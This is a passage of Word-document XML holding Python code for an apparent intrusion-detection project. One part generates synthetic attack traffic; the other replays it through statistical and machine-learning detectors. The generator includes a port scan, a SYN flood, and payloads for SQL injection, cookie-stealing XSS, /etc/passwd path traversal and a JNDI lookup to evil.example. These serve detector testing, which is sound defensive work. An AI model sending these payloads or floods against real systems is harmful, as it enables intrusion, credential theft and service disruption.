    <w:p w14:paraId="145BB1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phase 2: horizontal port scan, 200 distinct destination ports per second</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CB5B45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second in range(15, 20):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01D498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 in range(200):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53E3468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emit(parser_mod.build_tcp(sport=50000, dport=1 + i, flags=0x02,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51161F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src="192.168.1.66"), second, i, 200)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58BFD29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phases.append(("port scan", "15-19s", "KNN -&gt; Scan"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51FFB836" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5A4ACE0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phase 3: SYN flood at 1500 pps against a single port</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02CEB74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second in range(20, 28):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F5A56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 in range(1500):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57A4AF4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emit(parser_mod.build_tcp(sport=1024 + (i % 60000), dport=80,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63E442B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flags=0x02, src="192.168.1.99"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46E0CBE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second, i, 1500)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38FB8A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phases.append(("SYN flood", "20-27s", "Z-Score -&gt; DDoS"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24FE3190" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="46C036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phase 4: web application payloads</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="570920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payloads = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14209F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b"GET /?id=1 UNION SELECT username,password FROM users -- HTTP/1.1",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="429850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b"GET /?q=&lt;svg onerror=alert(document.cookie)&gt; HTTP/1.1",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68422D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b"GET /?file=../../../etc/passwd HTTP/1.1",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DE6B9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b"POST /api {\"x\":\"${jndi:ldap://evil.example/a}\"} HTTP/1.1",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="276176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1083CE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 payload in enumerate(payloads):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14159B4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emit(parser_mod.build_tcp(sport=41000 + i, dport=80, flags=0x18,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BF2A4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data=payload, src="192.168.1.77"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="468E1A7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28, i, len(payloads))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="549B0B3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phases.append(("web payloads", "28s", "Naive Bayes -&gt; Malicious"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B0A4D11" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="353B6A5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phase 5: traffic from a blacklisted source</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="436AFA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 in range(5):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A1C908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emit(parser_mod.build_tcp(sport=6000 + i, dport=445, flags=0x02,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34E085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src=blacklist_ip), 29, i, 5)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="246685C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phases.append(("known-bad IP", "29s", "Bloom Filter -&gt; Blacklisted"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C263274" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="306A50D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writer.close()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79AC84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wrote %s (%d packets, opens in Wireshark)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A5D48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(path, writer.count))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17BDF86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print("\n    phase                 window     expected detection")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DEF2F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 + "-" * 58)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BFB68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name, window, expected in phases:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46EA92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%-21s %-10s %s" % (name, window, expected))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30023A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writer.count</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="609B3916" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3DE9FA87" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="543CD85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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D4496D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replay</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B5C6F8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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="742F86A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ReplayEngine:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E4E859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"""Runs the full engine ensemble over decoded packets, second by second."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0568F876" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2710763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__init__(self, config=CONFIG, blacklist=None):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D943A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self.config = config</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A9ED3F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self.parser = parser_mod.PacketParser()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A37242B" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="707353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self.stats_engine = z_score.MinimalistStats(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="135058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window_size=config.zscore_window,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C5F9C3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threshold=config.zscore_threshold,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AF9880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min_pps=config.ddos_min_pps,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61E56E4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required_consecutive=config.ddos_consecutive_intervals)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39C3A6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self.knn_engine = knn.KNNMonitor(k=config.knn_k)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21D3A1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self.payload_engine = naive_bayes.PayloadMonitor()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EF0FE8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self.kmeans_engine = kmeans.KMeansMonitor(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E61F26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k=config.kmeans_k, learning_rate=config.kmeans_alpha)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E9C9C4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self.blacklist = bloom.BloomFilter(size=config.bloom_size,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3924213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hash_count=config.bloom_hashes)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A1C0C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ip in (blacklist or ["192.168.1.200", "10.0.0.66"]):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6105835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self.blacklist.add(ip)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B8B850E" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="227C40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self.alerts = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13C8327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self.scan_active_sources = set()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0244A7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self.counts = {"packets": 0, "TCP": 0, "UDP": 0, "ICMP": 0, "OTHER": 0}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EE4EE4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self.engine_hits = {"z_score": 0, "knn": 0, "naive_bayes": 0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F9719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"kmeans": 0, "bloom": 0}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72CB7A88" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0328ABE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_alert(self, second, engine, message, confidence=None, src=None):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A5726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meta = mitre.enrich(message, confidence)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C7323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self.engine_hits[engine] = self.engine_hits.get(engine, 0) + 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="382A6FC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self.alerts.append({</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F0E86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 round(second, 3),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B44DD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 engine,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BF230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 src,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3547C0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"message": message,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CB000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"technique_id": meta["technique_id"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27103C3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"tactic": meta["tactic"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34E1E9C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"severity": meta["severity"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59D290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"risk_score": meta["risk_score"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DFF29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0EC4A12" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="43E26C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run(self, path, verbose=True):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6077D37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reader = pcap.PcapReader(path)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FF98E3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first_ts = None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53D1E77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current_second = None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36A89F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packet_count = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DFC26A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unique_ports = set()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D649C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source_stats = {}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27D9A7FA" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="640DF35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ts, raw, _orig_len in reader:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="063D42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first_ts is None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7729FFB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first_ts = ts</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2143676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rel = ts - first_ts</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31E260C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second = int(rel)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54A7E9B7" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="48BE047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second boundary: run the per-interval engines ----</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CBF4F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current_second is None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1246D5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current_second = second</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="427A285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while second &gt; current_second:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="636A16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self._close_second(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77F2D8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current_second, packet_count, unique_ports, source_stats)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A67D72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packet_count = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CB5BF5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unique_ports = set()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="237B6E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source_stats = {}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="515BB55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current_second += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4648C7BC" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="71235E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 = self.parser.parse(raw)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74E0A6E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pkt is None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="696F115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continue</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64F8ACA3" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3303E3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self.counts["packets"] += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3735AA0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self.counts[pkt["proto"]] = self.counts.get(pkt["proto"], 0) + 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20C84FB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packet_count += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FA802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source_observation = source_stats.setdefault(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B6BC72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pkt["src"], {"packets": 0, "ports": set()})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60C475A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source_observation["packets"] += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BE1F72E" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="56D4A1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Bloom reputation check</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3641232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self.blacklist.check(pkt["src"]):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BEF034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 = self.blacklist.analyse(pkt["src"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B5DD91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self._alert(rel, "bloom",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A5F266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"BLACKLISTED IP DETECTED: %s (Flagged)" % pkt["src"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F50CA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verdict.confidence, pkt["src"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="496275F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continue</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6155146B" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="17FD3ED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pkt["dport"]:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69607C2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unique_ports.add(pkt["dport"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3587809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source_observation["ports"].add(pkt["dport"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A5C0E72" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="28A308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Naive Bayes payload inspection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="117A9B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pkt["payload"]:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27A761C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 = self.payload_engine.analyse(pkt["payload"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B5E059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verdict.is_threat:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4108B7C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self._alert(rel, "naive_bayes",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="067F7C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"MALICIOUS PAYLOAD! Confidence: %.2f%% Keywords: %s"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63DCE17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(verdict.confidence * 100,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BC255D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verdict.detail["keywords"]),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="596306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verdict.confidence, pkt["src"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4701D77B" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2CB45B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reader.close()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E2FEAC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current_second is not None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F4F9A7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self._close_second(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BE548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current_second, packet_count, unique_ports, source_stats)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="460CFA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self.report(verbose=verbose)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AFB51C9" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="167D90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_close_second(self, second, packet_count, unique_ports, source_stats):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A14717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"""Run the interval engines for one completed second."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D51F09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packet_count == 0:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B87D58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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6518765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ports = len(unique_ports)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7681961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dominant_src = self._dominant_source(source_stats, packet_count)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6467D50F" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7E657F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zv = self.stats_engine.analyse(packet_count)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16C9324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zv.detail["new_threat"]:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F9AAC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self._alert(second, "z_score",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BCA3BC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"DDoS DETECTED! Z-Score: %.2f (PPS: %d)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="086396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(zv.detail["z_score"], packet_count), zv.confidence,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F91DDE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dominant_src)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49FBD218" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5CB7CC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current_scan_sources = set()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="122AF03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src, observation in source_stats.items():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="144DDCF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src_ports = len(observation["ports"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A230D6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kv = self.knn_engine.analyse(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DC522A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src_ports, observation["packets"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ECFF1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kv.is_threat:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A72C3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current_scan_sources.add(src)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FB3B9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src not in self.scan_active_sources:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CE3234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self._alert(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20CD43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second, "knn",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DADA26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"PORT SCAN DETECTED! (Unique Ports: %d/sec)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="093C07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src_ports,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F0B1BC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kv.confidence, src)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4836455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self.scan_active_sources = current_scan_sources</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="650FDBF9" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2C76BB7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cv = self.kmeans_engine.analyse(packet_count, ports)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6202C6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cv.is_threat and not current_scan_sources and not zv.is_threat:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F87246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self._alert(second, "kmeans",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E8B4FF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"ANOMALY DETECTED (Cluster %d)! Suspicious activity."</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61878F7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cv.detail["cluster"], cv.confidence, dominant_src)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2896E4A7" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3FCEA5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_dominant_source(self, source_stats, total_packets):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75A26B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source_stats or total_packets &lt;= 0:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72FF755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None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D4618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 observation = max(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="152984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source_stats.items(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74C3D5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key=lambda item: item[1].get("packets", 0))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17DED3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share = observation.get("packets", 0) / float(total_packets)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A57F11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threshold = max(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AC9ACD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0.0, min(1.0, float(getattr(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25F997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self.config, "source_attribution_min_share", 0.50))))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7335845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src if share &gt;= threshold else None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67227643" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="301FC9F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report(self, verbose=True):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E9422E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summary = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="240CFD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"packets": self.counts["packets"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="216A8B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"protocols": {k: v for k, v in self.counts.items()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F79D6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k != "packets"},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="502BAF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"parser": self.parser.stats(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37066EC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"engine_hits": self.engine_hits,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CD58D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"alerts": self.alerts,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77960E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2B086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verbose:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5927C2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summary</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="655D36BC" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4409B7C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print("\n" + "=" * 66)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43DBC28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MANTIS Offline Replay Report")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60C1A2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 66)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F8BDD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packets decoded : %d" % self.counts["packets"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33B9CEF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protocol mix    : TCP=%d UDP=%d ICMP=%d OTHER=%d"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A4516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(self.counts.get("TCP", 0), self.counts.get("UDP", 0),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="478F080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self.counts.get("ICMP", 0), self.counts.get("OTHER", 0)))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5532D50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parser drops    : non-IPv4=%d malformed=%d"</w:t>
      </w:r>
    </w:p>
